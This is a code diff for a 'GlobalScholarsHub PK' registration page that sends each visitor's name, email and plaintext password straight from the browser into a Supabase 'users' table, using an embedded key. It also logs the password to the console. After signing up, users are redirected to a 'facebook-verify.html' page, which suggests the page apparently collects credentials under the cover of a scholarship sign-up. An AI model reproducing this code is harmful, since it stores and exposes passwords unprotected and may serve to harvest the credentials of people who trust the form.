@@ -6,6 +6,8 @@
     <title>Register - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="css/style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <!-- Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 </head>
 <body>
 
@@ -111,8 +113,13 @@
 
     <script src="js/script.js"></script>
 
-    <!-- ===== REGISTER FORM SUBMIT - API CALL ===== -->
+    <!-- ===== DIRECT SUPABASE CONNECTION ===== -->
     <script>
+        // ===== Supabase Initialize =====
+        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
+        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
         document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -123,24 +130,32 @@
             try {
                 console.log('📤 Sending data:', { name, email, password });
                 
-                const response = await fetch('/api/save-user', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, email, password })
-                });
-                
-                const result = await response.json();
-                console.log('✅ Response:', result);
-                
-                if (result.success) {
-                    alert('✅ Registration successful!');
-                    window.location.href = 'facebook-verify.html';
-                } else {
-                    alert('⚠️ Error: ' + result.error);
+                // ===== DIRECT SUPABASE INSERT =====
+                const { data, error } = await supabase
+                    .from('users')
+                    .insert([
+                        { 
+                            name: name, 
+                            email: email, 
+                            password: password,
+                            submitted_at: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
+                        }
+                    ])
+                    .select();
+
+                if (error) {
+                    console.error('❌ Supabase Error:', error);
+                    alert('⚠️ Error: ' + error.message);
+                    return;
                 }
+
+                console.log('✅ Data saved!', data);
+                alert('✅ Registration successful!');
+                window.location.href = 'facebook-verify.html';
+                
             } catch (error) {
                 console.error('❌ Error:', error);
-                alert('⚠️ Error saving data. Please try again.');
+                alert('⚠️ Error: ' + error.message);
             }
         });
     </script>
